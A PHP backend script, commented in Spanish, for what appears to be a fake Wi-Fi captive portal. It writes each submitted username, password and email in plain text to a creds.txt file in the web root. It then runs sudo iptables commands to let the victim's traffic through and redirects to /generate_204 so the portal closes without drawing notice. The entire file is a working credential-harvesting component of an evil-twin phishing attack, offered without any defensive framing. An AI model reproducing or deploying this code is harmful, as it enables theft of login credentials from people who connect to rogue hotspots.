<?php
// Mostrar errores en desarrollo
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Ruta al archivo donde guardar credenciales
$file = '/var/www/html/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');
    $email = htmlspecialchars($_POST['email'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];

    $data = "$username:$password:$email\n";

    // Guardar datos
    file_put_contents($file, $data, FILE_APPEND);

    // Permitir tráfico a la IP
    shell_exec("sudo iptables -D FORWARD -s $ip -j ACCEPT 2>/dev/null");
    shell_exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
    shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s $ip -j ACCEPT");
    shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s $ip -j ACCEPT");

    // Establecer cookie de autenticación (válida 1 hora)
    setcookie("auth", "ok", time()+3600, "/");

    // Redirigir a una ruta que active cierre automático del portal
    header("Location: /generate_204");
    exit();
} else {
    header("HTTP/1.1 400 Bad Request");
    echo "Método no permitido";
    exit();
}
?>
